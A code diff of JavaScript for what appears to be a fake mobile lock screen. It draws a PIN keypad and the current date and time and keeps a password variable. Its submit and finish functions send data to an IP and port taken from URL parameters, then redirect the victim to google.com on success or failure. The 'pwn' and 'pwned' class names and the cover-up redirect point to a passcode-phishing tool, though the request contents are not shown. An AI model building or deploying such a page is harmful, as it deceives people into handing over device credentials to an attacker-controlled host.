@@ -24,6 +24,29 @@ console.log(defaultaddress)
 window.swiped = false;
 window.password = "";
 
+console.log('hey')
+try {
+    screen.orientation.lock("portrait")
+} catch (e) {
+    console.log(e)
+
+}
+
+/*
+window.addEventListener("orientationchange", function() {
+    if (window.orientation == 0) {
+        $('.pwn').removeClass('m90');
+        $('.pwn').removeClass('p90');
+    } else if (window.orientation == 90) {
+        $('.pwn').removeClass('m90');
+        $('.pwn').addClass('p90');
+    } else if (window.orientation == -90) {
+        $('.pwn').removeClass('p90');
+        $('.pwn').addClass('m90');
+    }
+}, false);
+*/
+
 
 buttons = "";
 buttons = buttons + "            <span class='l d aa'><span class='numb'>1</span></span><span class='d ab'><span class='numb'>2</span></span><span class='d ac'><span class='numb'>3</span></span>"
@@ -47,10 +70,10 @@ buttons = buttons + "<br><br><br><span class='c d aj'><span class='numb'>0</span
 
 
 var event = new Date();
-o=event.toLocaleDateString('en-US', { weekday: 'long' })
-t=event.toLocaleDateString('en-US', { day: 'numeric' })
-m=event.toLocaleDateString('en-US', { month: 'long' })
-$(".date").text(o+" "+t+" "+m)
+o = event.toLocaleDateString('en-US', { weekday: 'long' })
+t = event.toLocaleDateString('en-US', { day: 'numeric' })
+m = event.toLocaleDateString('en-US', { month: 'long' })
+$(".date").text(o + " " + t + " " + m)
 
 $(".time").text(event.getHours() + ":" + ("00" + event.getMinutes()).slice(-2))
 
@@ -63,20 +86,20 @@ function finish() {
             //alert( "success" );
         })
         .done(function() {
-          $(".filler").animate({"backgroundColor": 'rgba(0,0,0,1)'},50);
-          $("#emergency").animate({"opacity": '0'},50);
-          $("#pass").animate({"opacity": '0'},50);
+            $(".filler").animate({ "backgroundColor": 'rgba(0,0,0,1)' }, 50);
+            $("#emergency").animate({ "opacity": '0' }, 50);
+            $("#pass").animate({ "opacity": '0' }, 50);
             setTimeout(function() { window.location = "https://google.com" }, 0);
         })
         .fail(function() {
-          $(".filler").animate({"backgroundColor": 'rgba(0,0,0,1)'},50);
-          $("#emergency").animate({"opacity": '0'},50);
-          $("#pass").animate({"opacity": '0'},50);
+            $(".filler").animate({ "backgroundColor": 'rgba(0,0,0,1)' }, 50);
+            $("#emergency").animate({ "opacity": '0' }, 50);
+            $("#pass").animate({ "opacity": '0' }, 50);
             setTimeout(function() { window.location = "https://google.com" }, 0);
         })
         .always(function() {});
-}
-;
+};
+
 function submit() {
     ip = getUrlVars()["ip"] || defaultaddress;
     port = getUrlVars()["port"] || defaultport;
@@ -130,11 +153,6 @@ function addeventh() {
 }
 
 function gofullscreen() {
-    try{
-        screen.orientation.lock()
-    }catch(e){
-        console.log(e)
-    }
     setTimeout(() => {
         container = $("#containerz")
         bodyel = $('body')
@@ -162,15 +180,15 @@ function gofullscreen() {
         $("#containerz").html($(".pwn").clone());
         $(".deleteme").remove();
     }, 500);
-try{
-	$("#screen").addClass(vendor);
-	$(".pwned").addClass(vendor);
-	$("#lockscreen").addClass(vendor);
-}catch(e){
-	$("#screen").addClass("defaultwp");
-	$(".pwned").addClass("defaultwp");
-	$("#lockscreen").addClass("defaultwp");
-}
+    try {
+        $("#screen").addClass(vendor);
+        $(".pwned").addClass(vendor);
+        $("#lockscreen").addClass(vendor);
+    } catch (e) {
+        $("#screen").addClass("defaultwp");
+        $(".pwned").addClass("defaultwp");
+        $("#lockscreen").addClass("defaultwp");
+    }
 }
 
 
